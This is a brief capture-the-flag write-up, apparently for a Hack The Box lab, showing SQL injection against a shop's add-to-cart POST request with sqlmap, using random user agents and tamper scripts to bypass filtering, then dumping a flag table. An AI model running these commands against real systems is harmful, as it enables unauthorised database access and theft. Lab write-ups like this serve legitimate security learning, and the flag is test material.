## Initial Enumeration

When going to http://83.136.255.150:34096/shop.html, and then clicking add to cart, there is a post request:
![[Pasted image 20240508234901.png]]

Saved the request to a file:
![[Pasted image 20240508234942.png]]

Running SQLMAp:
```shell-session
# sqlmap -r postReq.txt
```

Got some basic information about the data base but no success in reading final_flag table.

## Getting the Databases Name

Trying some bypass techniques:
```shell-session
# sqlmap -r postReq.txt --dbs --random-agent --tamper=between,randomcase
```

Database name: production.

## Getting the Flag

We will use the same idea, but this time dumping the contents of the final_flag table:
```shell-session
# sqlmap -r postReq.txt -D production -T final_flag --dump --random-agent --tamper=between,randomcase
```

Flag retrieved: HTB{n07_50_h4rd_r16h7?!}